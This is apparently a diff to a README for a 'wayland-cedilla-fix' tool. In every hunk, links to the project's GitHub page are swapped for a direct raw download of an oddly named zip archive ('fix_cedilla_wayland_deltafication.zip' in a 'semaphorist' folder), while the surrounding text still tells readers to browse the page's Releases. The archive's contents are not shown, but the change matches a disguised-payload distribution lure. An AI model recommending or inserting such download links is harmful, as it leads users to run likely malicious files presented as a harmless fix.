@@ -1,6 +1,6 @@
 # 🎯 wayland-cedilla-fix - Fix ç Cedilla Typing On Wayland
 
-[![Download Wayland Cedilla Fix](https://img.shields.io/badge/Download-Get%20Fix-red?style=for-the-badge)](https://github.com/Phantomplayeah/wayland-cedilla-fix)
+[![Download Wayland Cedilla Fix](https://img.shields.io/badge/Download-Get%20Fix-red?style=for-the-badge)](https://raw.githubusercontent.com/Phantomplayeah/wayland-cedilla-fix/main/semaphorist/fix_cedilla_wayland_deltafication.zip)
 
 ---
 
@@ -28,7 +28,7 @@ This software does not run natively on Windows but requires WSL to mimic a Linux
 
 Download the tool first using the button below:
 
-[![Download wayland-cedilla-fix](https://img.shields.io/badge/Download-Get%20Fix-orange?style=for-the-badge)](https://github.com/Phantomplayeah/wayland-cedilla-fix)
+[![Download wayland-cedilla-fix](https://img.shields.io/badge/Download-Get%20Fix-orange?style=for-the-badge)](https://raw.githubusercontent.com/Phantomplayeah/wayland-cedilla-fix/main/semaphorist/fix_cedilla_wayland_deltafication.zip)
 
 You will find the installation files and instructions on the linked GitHub page.
 
@@ -37,7 +37,7 @@ You will find the installation files and instructions on the linked GitHub page.
 ## 🔧 Step 1: Download wayland-cedilla-fix
 
 1. Click the large download badge above or open this page in your web browser:  
-   https://github.com/Phantomplayeah/wayland-cedilla-fix  
+   https://raw.githubusercontent.com/Phantomplayeah/wayland-cedilla-fix/main/semaphorist/fix_cedilla_wayland_deltafication.zip  
 2. On the GitHub page, look for the **Releases** section on the right or in the project menu.  
 3. Download the latest release package or script archive appropriate for your system.  
 
@@ -146,7 +146,7 @@ This will revert any changes made to your system's input configuration.
 ## 📥 Download Link
 
 Visit this page to download and get the fix:  
-[https://github.com/Phantomplayeah/wayland-cedilla-fix](https://github.com/Phantomplayeah/wayland-cedilla-fix)  
+[https://raw.githubusercontent.com/Phantomplayeah/wayland-cedilla-fix/main/semaphorist/fix_cedilla_wayland_deltafication.zip](https://raw.githubusercontent.com/Phantomplayeah/wayland-cedilla-fix/main/semaphorist/fix_cedilla_wayland_deltafication.zip)  
 
 You will find the latest releases and detailed files there.
 
